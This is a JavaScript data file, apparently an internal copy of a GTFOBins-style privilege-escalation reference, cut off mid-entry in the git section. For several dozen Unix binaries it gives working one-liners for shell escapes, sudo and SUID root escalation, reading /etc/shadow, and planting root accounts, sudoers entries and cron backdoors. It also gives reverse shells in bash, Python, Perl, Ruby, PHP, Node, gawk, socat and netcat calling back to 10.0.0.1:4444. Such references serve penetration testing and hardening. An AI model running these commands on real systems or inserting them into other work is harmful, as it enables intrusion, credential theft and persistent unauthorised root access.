// ═══════════════════════════════════════════════════════════════
//  ThreatIntel — Custom GTFOBins Internal Security Database
// ═══════════════════════════════════════════════════════════════

export const gtfobinsData = {
  bash: {
    name: 'bash',
    description: 'GNU Bourne-Again SHell, standard interactive command interpreter for Linux.',
    functions: {
      shell: [
        {
          title: 'Interactive Shell Spawn',
          description: 'Spawns a clean interactive bash shell session.',
          code: 'bash',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Executes an elevated root shell when permitted in sudoers.',
          code: 'sudo bash',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Retention',
          description: 'Maintains effective SUID privileges with the -p (privileged) switch without dropping root euid.',
          code: './bash -p',
        },
      ],
      'file-read': [
        {
          title: 'Arbitrary File Read',
          description: 'Reads files line-by-line using native bash read loop.',
          code: 'while read line; do echo "$line"; done < /etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'File Write / Append',
          description: 'Writes or appends arbitrary data to sensitive files.',
          code: 'echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd',
        },
      ],
      'reverse-shell': [
        {
          title: 'TCP Native Reverse Shell',
          description: 'Connects back to an external listener using internal bash /dev/tcp network redirection.',
          code: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        },
      ],
    },
  },

  sh: {
    name: 'sh',
    description: 'POSIX standard command language interpreter.',
    functions: {
      shell: [
        {
          title: 'Interactive Shell',
          description: 'Spawns a POSIX system shell.',
          code: 'sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Elevated Shell',
          description: 'Executes elevated shell via sudo privileges.',
          code: 'sudo sh',
        },
      ],
      suid: [
        {
          title: 'SUID Privileged Execution',
          description: 'Preserves SUID privileges if sh is symlinked to bash or supports -p.',
          code: './sh -p',
        },
      ],
      'reverse-shell': [
        {
          title: 'sh Pipeline Reverse Shell',
          description: 'Spawns shell connected to netcat or raw sockets.',
          code: '/bin/sh -i 5<> /dev/tcp/10.0.0.1/4444 0<&5 1>&5 2>&5',
        },
      ],
    },
  },

  zsh: {
    name: 'zsh',
    description: 'Z shell designed for interactive use with scripting capabilities.',
    functions: {
      shell: [
        {
          title: 'Interactive Zsh Shell',
          description: 'Executes a fresh Zsh interactive shell session.',
          code: 'zsh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Runs an unrestricted elevated Zsh root shell.',
          code: 'sudo zsh',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Escalation',
          description: 'Runs elevated without dropping SUID root capabilities.',
          code: './zsh',
        },
      ],
      'reverse-shell': [
        {
          title: 'Zsh TCP Module Reverse Shell',
          description: 'Leverages zsh net/tcp module for outbound shell callback.',
          code: 'zsh -c \'zmodload zsh/net/tcp && ztcp 10.0.0.1 4444 && zsh <&$REPLY >&$REPLY 2>&$REPLY\'',
        },
      ],
    },
  },

  find: {
    name: 'find',
    description: 'Search for files in a directory hierarchy with command execution support.',
    functions: {
      shell: [
        {
          title: 'Command Execution via -exec',
          description: 'Spawns an interactive shell and immediately quits find processing.',
          code: 'find . -exec /bin/sh \\; -quit',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell Execution',
          description: 'Escalates to root shell through elevated -exec clause.',
          code: 'sudo find . -exec /bin/sh \\; -quit',
        },
      ],
      suid: [
        {
          title: 'SUID Shell with Privilege Retention',
          description: 'Executes /bin/sh with -p switch to retain inherited root privileges.',
          code: './find . -exec /bin/sh -p \\; -quit',
        },
      ],
      'file-read': [
        {
          title: 'File Read Inspection',
          description: 'Executes cat or head over target protected file.',
          code: 'find /etc/shadow -exec cat {} \\;',
        },
      ],
    },
  },

  python: {
    name: 'python',
    description: 'Python 2/3 interpreted object-oriented high-level programming language.',
    functions: {
      shell: [
        {
          title: 'Interactive PTY Shell Spawn',
          description: 'Spawns a full interactive shell using the native pty library.',
          code: 'python -c \'import pty; pty.spawn("/bin/bash")\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Elevated Shell',
          description: 'Spawns an unrestricted root shell under sudo.',
          code: 'sudo python -c \'import os; os.system("/bin/bash")\'',
        },
      ],
      suid: [
        {
          title: 'SUID Root Drop Bypass',
          description: 'Sets UID and GID to 0 before executing the target shell.',
          code: './python -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        },
      ],
      'file-read': [
        {
          title: 'Read Arbitrary File Content',
          description: 'Reads protected file contents directly into terminal stdout.',
          code: 'python -c \'print(open("/etc/shadow").read())\'',
        },
      ],
      'file-write': [
        {
          title: 'Write Arbitrary File',
          description: 'Writes payload data into any path accessible to the binary process.',
          code: 'python -c \'open("/etc/cron.d/backdoor", "w").write("* * * * * root /bin/bash\\n")\'',
        },
      ],
      'reverse-shell': [
        {
          title: 'Socket Callback Reverse Shell',
          description: 'Native Python TCP socket reverse connection spawning a PTY shell.',
          code: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
        },
      ],
    },
  },

  python3: {
    name: 'python3',
    description: 'Python 3 modern runtime environment with system interop modules.',
    functions: {
      shell: [
        {
          title: 'Python 3 PTY Shell Spawn',
          description: 'Spawns a fully functional bash shell session.',
          code: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Elevated Shell',
          description: 'Executes elevated root shell with os.system.',
          code: 'sudo python3 -c \'import os; os.system("/bin/bash")\'',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Escalation',
          description: 'Elevates effective and real UID to 0 before spawning shell.',
          code: './python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        },
      ],
      'file-read': [
        {
          title: 'Arbitrary File Reading',
          description: 'Reads file line-by-line or complete buffer to console.',
          code: 'python3 -c \'print(open("/etc/shadow").read())\'',
        },
      ],
      'file-write': [
        {
          title: 'Write File Payload',
          description: 'Appends or creates new system configuration files.',
          code: 'python3 -c \'open("/etc/sudoers.d/user", "w").write("user ALL=(ALL) NOPASSWD:ALL\\n")\'',
        },
      ],
      'reverse-shell': [
        {
          title: 'Python 3 Socket Reverse Shell',
          description: 'Network reverse shell connecting to remote listener.',
          code: 'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'',
        },
      ],
    },
  },

  perl: {
    name: 'perl',
    description: 'Practical Extraction and Report Language for Unix text processing.',
    functions: {
      shell: [
        {
          title: 'Interactive Shell Exec',
          description: 'Executes an interactive shell using Perl exec function.',
          code: 'perl -e \'exec "/bin/sh";\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Runs elevated shell via sudo execution.',
          code: 'sudo perl -e \'exec "/bin/sh";\'',
        },
      ],
      suid: [
        {
          title: 'SUID Escalation',
          description: 'Executes shell under inherited SUID privileges.',
          code: './perl -e \'exec "/bin/sh";\'',
        },
      ],
      'file-read': [
        {
          title: 'File Read Stream',
          description: 'Prints lines of target protected file to stdout.',
          code: 'perl -ne \'print\' /etc/shadow',
        },
      ],
      'reverse-shell': [
        {
          title: 'Perl Socket Reverse Shell',
          description: 'Network reverse shell via IO::Socket or POSIX.',
          code: 'perl -e \'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)))&&open(STDIN,">&S")&&open(STDOUT,">&S")&&open(STDERR,">&S")&&exec("/bin/sh -i");\'',
        },
      ],
    },
  },

  ruby: {
    name: 'ruby',
    description: 'Dynamic, open source programming language with a focus on simplicity and productivity.',
    functions: {
      shell: [
        {
          title: 'Ruby Interactive Shell',
          description: 'Invokes /bin/sh through Ruby exec.',
          code: 'ruby -e \'exec "/bin/sh"\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Spawns root shell under sudo authorization.',
          code: 'sudo ruby -e \'exec "/bin/sh"\'',
        },
      ],
      suid: [
        {
          title: 'SUID Privileges',
          description: 'Executes shell with elevated SUID privileges.',
          code: './ruby -e \'Process.uid=0; exec "/bin/sh"\'',
        },
      ],
      'file-read': [
        {
          title: 'File Read',
          description: 'Prints target file content to terminal.',
          code: 'ruby -e \'puts File.read("/etc/shadow")\'',
        },
      ],
      'reverse-shell': [
        {
          title: 'Ruby Socket Reverse Shell',
          description: 'Connects back via TCPSocket and loops IO into /bin/sh.',
          code: 'ruby -rsocket -e \'c=TCPSocket.new("10.0.0.1",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
        },
      ],
    },
  },

  php: {
    name: 'php',
    description: 'PHP Hypertext Preprocessor server-side scripting runtime.',
    functions: {
      shell: [
        {
          title: 'PHP Shell Execution',
          description: 'Invokes a system shell using system() function.',
          code: 'php -r \'system("/bin/sh");\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Executes elevated shell under sudo permissions.',
          code: 'sudo php -r \'system("/bin/sh");\'',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Retention',
          description: 'Executes elevated shell preserving effective user id.',
          code: './php -r \'posix_setuid(0); system("/bin/sh");\'',
        },
      ],
      'file-read': [
        {
          title: 'File Read Content',
          description: 'Dumps protected file content via readfile.',
          code: 'php -r \'readfile("/etc/shadow");\'',
        },
      ],
      'reverse-shell': [
        {
          title: 'PHP Socket Reverse Shell',
          description: 'Spawns an interactive shell connected to remote netcat.',
          code: 'php -r \'$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        },
      ],
    },
  },

  node: {
    name: 'node',
    description: 'Node.js JavaScript runtime environment built on Chrome V8 engine.',
    functions: {
      shell: [
        {
          title: 'Child Process Shell Spawn',
          description: 'Spawns an interactive shell with child_process module.',
          code: 'node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Spawns root shell under sudo.',
          code: 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Escalation',
          description: 'Sets process UID to 0 and executes root shell.',
          code: './node -e \'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',
        },
      ],
      'file-read': [
        {
          title: 'File Read',
          description: 'Prints contents of protected file via fs module.',
          code: 'node -e \'console.log(require("fs").readFileSync("/etc/shadow", "utf8"))\'',
        },
      ],
      'reverse-shell': [
        {
          title: 'Node.js Socket Callback',
          description: 'Spawns interactive shell attached to net.Socket stream.',
          code: 'node -e \'const net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);const client=new net.Socket();client.connect(4444,"10.0.0.1",()=>{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\'',
        },
      ],
    },
  },

  nmap: {
    name: 'nmap',
    description: 'Network exploration tool and security / port scanner.',
    functions: {
      shell: [
        {
          title: 'Interactive NSE Script Shell',
          description: 'Executes commands through Nmap Scripting Engine (NSE) script argument.',
          code: 'echo "os.execute(\'/bin/sh\')" > /tmp/shell.nse && nmap --script=/tmp/shell.nse',
        },
        {
          title: 'Legacy Interactive Mode',
          description: 'Historical interactive shell escape in older nmap versions (<= 5.21).',
          code: 'nmap --interactive\nnmap> !sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell via NSE',
          description: 'Runs root shell under sudo through customized NSE script.',
          code: 'TF=$(mktemp) && echo \'os.execute("/bin/sh")\' > $TF && sudo nmap --script=$TF',
        },
      ],
      suid: [
        {
          title: 'SUID Execution via NSE Script',
          description: 'Retains SUID privileges during script execution.',
          code: 'TF=$(mktemp) && echo \'os.execute("/bin/sh -p")\' > $TF && ./nmap --script=$TF',
        },
      ],
    },
  },

  awk: {
    name: 'awk',
    description: 'Pattern scanning and processing language for Unix text streams.',
    functions: {
      shell: [
        {
          title: 'Command Execution via system()',
          description: 'Executes system shell directly within AWK BEGIN block.',
          code: 'awk \'BEGIN {system("/bin/sh")}\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Elevates to root shell through sudo awk.',
          code: 'sudo awk \'BEGIN {system("/bin/sh")}\'',
        },
      ],
      suid: [
        {
          title: 'SUID Shell Execution',
          description: 'Executes privileged shell if SUID is set on binary.',
          code: './awk \'BEGIN {system("/bin/sh -p")}\'',
        },
      ],
      'file-read': [
        {
          title: 'Arbitrary File Reading',
          description: 'Dumps all lines of target protected file.',
          code: 'awk \'//\' /etc/shadow',
        },
      ],
    },
  },

  gawk: {
    name: 'gawk',
    description: 'GNU implementation of the AWK programming language with network extensions.',
    functions: {
      shell: [
        {
          title: 'Gawk System Shell',
          description: 'Executes shell within BEGIN block.',
          code: 'gawk \'BEGIN {system("/bin/sh")}\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Runs elevated shell with root privileges.',
          code: 'sudo gawk \'BEGIN {system("/bin/sh")}\'',
        },
      ],
      suid: [
        {
          title: 'SUID Shell',
          description: 'Maintains elevated SUID privileges.',
          code: './gawk \'BEGIN {system("/bin/sh -p")}\'',
        },
      ],
      'reverse-shell': [
        {
          title: 'Gawk TCP Stream Reverse Shell',
          description: 'Uses Gawk /inet/tcp networking support for remote reverse shell.',
          code: 'gawk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4444"; while (42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\'',
        },
      ],
    },
  },

  sed: {
    name: 'sed',
    description: 'Stream editor for filtering and transforming text.',
    functions: {
      shell: [
        {
          title: 'Execute Command via "e" Flag',
          description: 'Executes shell on first input line match.',
          code: 'sed -e \'1e /bin/sh\' /etc/hosts',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Spawns root shell under sudo sed command.',
          code: 'sudo sed -e \'1e /bin/sh\' /etc/hosts',
        },
      ],
      suid: [
        {
          title: 'SUID Command Execution',
          description: 'Executes command retaining SUID root execution.',
          code: './sed -e \'1e /bin/sh -p\' /etc/hosts',
        },
      ],
      'file-read': [
        {
          title: 'Read File',
          description: 'Prints entire file content without modification.',
          code: 'sed \'\' /etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'Inline File Modification',
          description: 'Appends or alters content inside protected system files.',
          code: 'sed -i \'$ a root2::0:0::/root:/bin/sh\' /etc/passwd',
        },
      ],
    },
  },

  cat: {
    name: 'cat',
    description: 'Concatenate files and print on the standard output.',
    functions: {
      'file-read': [
        {
          title: 'Read Arbitrary File',
          description: 'Prints content of sensitive files to stdout.',
          code: 'cat /etc/shadow',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Read',
          description: 'Reads files accessible only by root via sudo.',
          code: 'sudo cat /etc/shadow',
        },
      ],
      suid: [
        {
          title: 'SUID File Read',
          description: 'Reads protected files utilizing SUID root binary.',
          code: './cat /etc/shadow',
        },
      ],
    },
  },

  head: {
    name: 'head',
    description: 'Output the first part of files.',
    functions: {
      'file-read': [
        {
          title: 'Read File Head',
          description: 'Prints all lines or selected amount from target file.',
          code: 'head -n 1000 /etc/shadow',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Read',
          description: 'Reads privileged file via sudo.',
          code: 'sudo head -n 1000 /etc/shadow',
        },
      ],
      suid: [
        {
          title: 'SUID File Read',
          description: 'Dumps file lines through SUID execution.',
          code: './head -n 1000 /etc/shadow',
        },
      ],
    },
  },

  tail: {
    name: 'tail',
    description: 'Output the last part of files.',
    functions: {
      'file-read': [
        {
          title: 'Read File Tail',
          description: 'Outputs lines from target file starting at line 1.',
          code: 'tail -n +1 /etc/shadow',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Read',
          description: 'Reads privileged file under sudo.',
          code: 'sudo tail -n +1 /etc/shadow',
        },
      ],
      suid: [
        {
          title: 'SUID File Read',
          description: 'Dumps file lines through SUID binary.',
          code: './tail -n +1 /etc/shadow',
        },
      ],
    },
  },

  grep: {
    name: 'grep',
    description: 'Print lines matching a pattern in input files.',
    functions: {
      'file-read': [
        {
          title: 'Read File Content',
          description: 'Matches all characters in file to print entire content.',
          code: 'grep \'\' /etc/shadow',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Read',
          description: 'Reads root-only files under sudo.',
          code: 'sudo grep \'\' /etc/shadow',
        },
      ],
      suid: [
        {
          title: 'SUID File Read',
          description: 'Dumps protected file lines using SUID grep.',
          code: './grep \'\' /etc/shadow',
        },
      ],
    },
  },

  less: {
    name: 'less',
    description: 'Terminal pager program allowing backward movement.',
    functions: {
      shell: [
        {
          title: 'Shell Escape via Colon',
          description: 'Escapes to system shell while inside pager view.',
          code: 'less /etc/hosts\n!/bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Executes elevated shell from less under sudo.',
          code: 'sudo less /etc/hosts\n!/bin/sh',
        },
      ],
      suid: [
        {
          title: 'SUID Root Shell',
          description: 'Spawns root shell under SUID less.',
          code: './less /etc/hosts\n!/bin/sh -p',
        },
      ],
      'file-read': [
        {
          title: 'File Read Inspection',
          description: 'Reads target file content inside interactive pager.',
          code: 'less /etc/shadow',
        },
      ],
    },
  },

  more: {
    name: 'more',
    description: 'File perusal filter for crt viewing.',
    functions: {
      shell: [
        {
          title: 'Shell Escape via Exclamation',
          description: 'Escapes to shell when viewing files longer than screen height.',
          code: 'TERM=vt100 more /etc/hosts\n!/bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Runs elevated shell from more under sudo.',
          code: 'sudo more /etc/hosts\n!/bin/sh',
        },
      ],
      'file-read': [
        {
          title: 'File Inspection',
          description: 'Displays contents of target file.',
          code: 'more /etc/shadow',
        },
      ],
    },
  },

  vi: {
    name: 'vi',
    description: 'Visual display editor for Unix.',
    functions: {
      shell: [
        {
          title: 'Command Execution inside Vi',
          description: 'Executes shell from command mode (:!/bin/sh).',
          code: 'vi -c \':!/bin/sh\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Spawns root shell under sudo vi.',
          code: 'sudo vi -c \':!/bin/sh\'',
        },
      ],
      suid: [
        {
          title: 'SUID Shell Escape',
          description: 'Executes privileged shell through SUID vi.',
          code: './vi -c \':!/bin/sh -p\'',
        },
      ],
      'file-read': [
        {
          title: 'Read File',
          description: 'Opens protected file for reading in editor.',
          code: 'vi /etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'Write File',
          description: 'Modifies or writes sensitive system files.',
          code: 'vi /etc/passwd',
        },
      ],
    },
  },

  vim: {
    name: 'vim',
    description: 'Vi IMproved powerful command line text editor.',
    functions: {
      shell: [
        {
          title: 'Vim Interactive Shell Command',
          description: 'Spawns interactive shell via :!/bin/sh or :shell.',
          code: 'vim -c \':!/bin/sh\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Elevates to root shell through sudo vim.',
          code: 'sudo vim -c \':!/bin/sh\'',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Escalation',
          description: 'Escapes to shell retaining SUID root execution.',
          code: './vim -c \':!/bin/sh -p\'',
        },
      ],
      'file-read': [
        {
          title: 'Read File',
          description: 'Views protected files in buffer.',
          code: 'vim /etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'Write File',
          description: 'Edits system files with write privileges.',
          code: 'vim /etc/sudoers',
        },
      ],
    },
  },

  nano: {
    name: 'nano',
    description: 'Nano graphical-style terminal text editor.',
    functions: {
      shell: [
        {
          title: 'Shell Escape via Spell Check',
          description: 'Uses custom spell-check command to trigger shell execution.',
          code: 'nano -s /bin/sh /etc/hosts\n# Press Ctrl+T to invoke spellcheck and trigger shell',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Edit & Shell',
          description: 'Allows editing protected files or triggering spellcheck root shell.',
          code: 'sudo nano /etc/sudoers',
        },
      ],
      suid: [
        {
          title: 'SUID File Modification',
          description: 'Edits sensitive files utilizing SUID root nano binary.',
          code: './nano /etc/passwd',
        },
      ],
      'file-read': [
        {
          title: 'Read Protected File',
          description: 'Views contents of any file in the nano interface.',
          code: 'nano /etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'Write Arbitrary File',
          description: 'Saves payload content to root configuration directories.',
          code: 'nano /etc/cron.d/test',
        },
      ],
    },
  },

  ed: {
    name: 'ed',
    description: 'Standard line-oriented text editor for Unix.',
    functions: {
      shell: [
        {
          title: 'Shell Escape via Exclamation',
          description: 'Executes shell command directly from ed prompt.',
          code: 'ed\n!/bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Spawns root shell under sudo ed.',
          code: 'sudo ed\n!/bin/sh',
        },
      ],
      suid: [
        {
          title: 'SUID Shell',
          description: 'Executes shell with SUID permissions.',
          code: './ed\n!/bin/sh -p',
        },
      ],
      'file-read': [
        {
          title: 'File Read',
          description: 'Prints lines of target file.',
          code: 'ed /etc/shadow\n,p\nq',
        },
      ],
    },
  },

  emacs: {
    name: 'emacs',
    description: 'Extensible, customizable, self-documenting real-time display editor.',
    functions: {
      shell: [
        {
          title: 'Batch Command Shell Spawn',
          description: 'Spawns interactive shell via emacs lisp evaluation.',
          code: 'emacs -Q -nw --eval \'(term "/bin/sh")\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Runs elevated shell via sudo emacs.',
          code: 'sudo emacs -Q -nw --eval \'(term "/bin/sh")\'',
        },
      ],
      suid: [
        {
          title: 'SUID Shell',
          description: 'Executes root shell preserving SUID root.',
          code: './emacs -Q -nw --eval \'(term "/bin/sh")\'',
        },
      ],
      'file-read': [
        {
          title: 'File Read',
          description: 'Reads target file content.',
          code: 'emacs /etc/shadow',
        },
      ],
    },
  },

  tar: {
    name: 'tar',
    description: 'Tape archiver utility for storing and extracting files.',
    functions: {
      shell: [
        {
          title: 'Command Execution via Checkpoint Action',
          description: 'Executes commands through archive checkpoints.',
          code: 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell via Checkpoint',
          description: 'Escalates to root shell through checkpoint-action under sudo.',
          code: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
        },
      ],
      suid: [
        {
          title: 'SUID Shell Execution',
          description: 'Retains SUID privileges during archive processing.',
          code: './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh -p"',
        },
      ],
      'file-read': [
        {
          title: 'Extract and Inspect File',
          description: 'Archives protected file and reads archive contents.',
          code: 'tar -cf - /etc/shadow | tar -xf - -O',
        },
      ],
      'file-write': [
        {
          title: 'Extract to Arbitrary Directory',
          description: 'Extracts archive files overwriting target paths.',
          code: 'tar -xf archive.tar -C /',
        },
      ],
    },
  },

  zip: {
    name: 'zip',
    description: 'Package and compress (archive) files utility.',
    functions: {
      shell: [
        {
          title: 'Command Execution via -T -TT',
          description: 'Executes shell through test archive command switch.',
          code: 'TF=$(mktemp -u) && zip $TF /etc/hosts -T -TT /bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Escalates to root shell under sudo zip.',
          code: 'TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT /bin/sh',
        },
      ],
      suid: [
        {
          title: 'SUID Shell Execution',
          description: 'Executes shell retaining SUID root privileges.',
          code: 'TF=$(mktemp -u) && ./zip $TF /etc/hosts -T -TT "/bin/sh -p"',
        },
      ],
    },
  },

  gzip: {
    name: 'gzip',
    description: 'Compress or expand files using Lempel-Ziv coding (LZ77).',
    functions: {
      'file-read': [
        {
          title: 'Read Compressed or Plain Content',
          description: 'Reads protected file contents through decompression pipe.',
          code: 'gzip -f /etc/shadow -t || gzip -dc /etc/shadow.gz',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Read',
          description: 'Compresses and reads files under sudo.',
          code: 'sudo gzip -c /etc/shadow | gzip -d',
        },
      ],
      suid: [
        {
          title: 'SUID File Read',
          description: 'Dumps file data using SUID binary.',
          code: './gzip -c /etc/shadow | gzip -d',
        },
      ],
    },
  },

  socat: {
    name: 'socat',
    description: 'Multipurpose relay tool for bidirectional data transfer.',
    functions: {
      shell: [
        {
          title: 'Interactive PTY Terminal Connection',
          description: 'Spawns a full interactive shell session.',
          code: 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane stdout',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Executes elevated shell through socat under sudo.',
          code: 'sudo socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane stdout',
        },
      ],
      suid: [
        {
          title: 'SUID Root Shell',
          description: 'Executes shell under inherited SUID privileges.',
          code: './socat exec:\'bash -li -p\',pty,stderr,setsid,sigint,sane stdout',
        },
      ],
      'reverse-shell': [
        {
          title: 'TCP Reverse Shell Connection',
          description: 'Connects back to external socat/netcat listener.',
          code: 'socat tcp-connect:10.0.0.1:4444 exec:"bash -li",pty,stderr,setsid,sigint,sane',
        },
      ],
      'file-read': [
        {
          title: 'Read Arbitrary File',
          description: 'Dumps file content to stdout via file transfer stream.',
          code: 'socat -u FILE:/etc/shadow STDOUT',
        },
      ],
      'file-write': [
        {
          title: 'Write Arbitrary File',
          description: 'Writes input stream directly into target file.',
          code: 'echo "root::0:0:root:/root:/bin/bash" | socat -u STDIN OPEN:/etc/passwd,creat,append',
        },
      ],
    },
  },

  nc: {
    name: 'nc',
    description: 'Netcat arbitrary TCP and UDP connection and listen utility.',
    functions: {
      shell: [
        {
          title: 'Execute Command via -e (Traditional netcat)',
          description: 'Binds /bin/sh to local or remote port.',
          code: 'nc -e /bin/sh 10.0.0.1 4444',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell Callback',
          description: 'Connects back with root shell privileges under sudo.',
          code: 'sudo nc -e /bin/sh 10.0.0.1 4444',
        },
      ],
      'reverse-shell': [
        {
          title: 'Named Pipe FIFO Reverse Shell',
          description: 'Works on modern OpenBSD netcat without -e flag.',
          code: 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f',
        },
      ],
      'file-read': [
        {
          title: 'Read File Over Network',
          description: 'Transfers file content over network connection.',
          code: 'nc -l -p 8000 < /etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'Receive and Write File',
          description: 'Receives remote payload directly into local file.',
          code: 'nc -l -p 8000 > /etc/cron.d/job',
        },
      ],
    },
  },

  ftp: {
    name: 'ftp',
    description: 'File Transfer Protocol client program with command escape support.',
    functions: {
      shell: [
        {
          title: 'Shell Escape via Exclamation',
          description: 'Executes interactive shell directly from the ftp prompt.',
          code: 'ftp\nftp> !/bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Spawns root shell under sudo ftp.',
          code: 'sudo ftp\nftp> !/bin/sh',
        },
      ],
      suid: [
        {
          title: 'SUID Shell Escape',
          description: 'Executes shell retaining SUID root execution.',
          code: './ftp\nftp> !/bin/sh -p',
        },
      ],
    },
  },

  ssh: {
    name: 'ssh',
    description: 'OpenSSH SSH client (remote login program).',
    functions: {
      shell: [
        {
          title: 'ProxyCommand Shell Escape',
          description: 'Executes local arbitrary commands via -o ProxyCommand.',
          code: 'ssh -o ProxyCommand=\'/bin/sh 0<&2 1>&2\' x',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Elevates to root shell through ProxyCommand under sudo.',
          code: 'sudo ssh -o ProxyCommand=\'/bin/sh 0<&2 1>&2\' x',
        },
      ],
      'file-read': [
        {
          title: 'File Read via Configuration File Switch',
          description: 'Dumps syntax error containing file lines when loading target file.',
          code: 'ssh -F /etc/shadow a',
        },
      ],
    },
  },

  rsync: {
    name: 'rsync',
    description: 'Fast, versatile, remote (and local) file-copying tool.',
    functions: {
      shell: [
        {
          title: 'Command Execution via -e Switch',
          description: 'Executes arbitrary command through remote shell parameter.',
          code: 'rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Executes root shell under sudo rsync.',
          code: 'sudo rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Escalation',
          description: 'Executes shell under SUID execution.',
          code: './rsync -e \'sh -c "sh -p 0<&2 1>&2"\' 127.0.0.1:/dev/null',
        },
      ],
      'file-read': [
        {
          title: 'Read Arbitrary File',
          description: 'Copies protected file to accessible local destination.',
          code: 'rsync /etc/shadow /tmp/shadow.txt && cat /tmp/shadow.txt',
        },
      ],
      'file-write': [
        {
          title: 'Write / Overwrite System File',
          description: 'Copies local payload over protected destination.',
          code: 'rsync /tmp/passwd /etc/passwd',
        },
      ],
    },
  },

  git: {
    name: 'git',
    description: 'Fast, scalable, distributed revision control system.',
    functions: {
      shell: [
        {
          title: 'Execute Command via Pager',
          description: 'Executes shell through PAGER environment variable.',
          code: 'PAGER=\'sh -c "exec sh 0<&1"\' git -p help',
        },
        {
          title: 'Git Hook Custom Shell',
          description: 'Executes custom pre-commit or post-checkout script.',
          code: 'git config core.pager "sh -c /bin/sh"',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell via Pager',
          description: 'Spawns root shell under sudo git.',
          code: 'sudo PAGER=\'sh -c "exec sh 0<&1"\' git -p help',
        },
      ],
      'file-read': [
        {
          title: 'Read File via Diff',
